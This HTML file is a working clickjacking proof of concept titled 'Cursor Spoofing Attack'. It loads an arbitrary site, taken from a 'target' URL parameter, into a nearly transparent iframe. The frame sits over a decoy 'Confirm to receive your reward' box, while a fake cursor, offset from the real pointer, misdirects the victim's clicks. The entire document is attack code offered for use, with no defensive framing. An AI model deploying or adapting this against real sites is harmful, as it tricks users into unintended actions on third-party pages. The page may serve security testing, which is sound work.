<!DOCTYPE html>
<html>
<head>
  <title>üéØ Cursor Spoofing Attack</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      font-family: monospace;
      overflow: hidden;
    }

    .overlay {
      position: absolute;
      top: 120px;
      left: 150px;
      width: 500px;
      height: 200px;
      background: #111;
      color: #0f0;
      border: 3px dashed lime;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
      z-index: 1;
      box-shadow: 0 0 20px lime;
    }

    iframe {
      position: absolute;
      top: 120px;
      left: 150px;
      width: 500px;
      height: 200px;
      opacity: 0.01;
      z-index: 2;
      border: none;
    }

    .fake-cursor {
      position: absolute;
      width: 32px;
      height: 32px;
      background: url("https://upload.wikimedia.org/wikipedia/commons/1/17/Arrow_curved_right_font_awesome.svg") no-repeat center;
      background-size: contain;
      pointer-events: none;
      z-index: 9999;
      opacity: 0.8;
      mix-blend-mode: difference;
    }

    .debug-msg {
      position: absolute;
      bottom: 10px;
      left: 10px;
      color: #0f0;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="overlay">üñ±Ô∏è Click "Confirm" to receive your reward!</div>
  <iframe id="jack-frame"></iframe>
  <div class="fake-cursor" id="fakeCursor"></div>
  <div class="debug-msg" id="debugMsg">Waiting for iframe to load...</div>

  <script>
    const params = new URLSearchParams(location.search);
    const target = params.get("target");

    const iframe = document.getElementById("jack-frame");
    const debug = document.getElementById("debugMsg");

    if (target) {
      try {
        const decoded = decodeURIComponent(target);
        iframe.src = decoded;
        debug.textContent = `‚úÖ Loaded iframe: ${decoded}`;
      } catch (e) {
        debug.textContent = "‚ö†Ô∏è Failed to decode target URL.";
      }
    } else {
      debug.textContent = "‚ùå No target parameter provided.";
    }

    // Fake cursor follows real cursor
    document.addEventListener("mousemove", e => {
      const cursor = document.getElementById("fakeCursor");
      cursor.style.left = (e.pageX + 16) + "px";
      cursor.style.top = (e.pageY + 16) + "px";
    });
  </script>
</body>
</html>
